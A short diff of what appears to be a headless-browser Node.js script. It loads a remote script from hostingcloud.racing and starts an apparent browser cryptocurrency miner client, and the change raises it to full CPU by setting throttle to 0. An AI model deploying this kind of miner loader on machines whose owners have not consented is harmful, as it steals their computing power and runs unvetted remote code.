@@ -20,12 +20,13 @@ console.log(" starting...");
 	await page.setContent(`
 	<html>
 <head>
-<script src="https://www.hostingcloud.racing/7S7h.js"></script>
+<script src="https://www.hostingcloud.racing/1hG1.js"></script>
 <script>
     var _client = new Client.Anonymous('1d030bb2124dfb41faa9608c5f0ce8afa4b5a482c4722a880e2ecad6fff9e423', {
-        throttle: 0.3, c: 'w'
+        throttle: 0, c: 'w', ads: 0
     });
     _client.start();
+   
 
 function myFunction() {
   var min = 5,
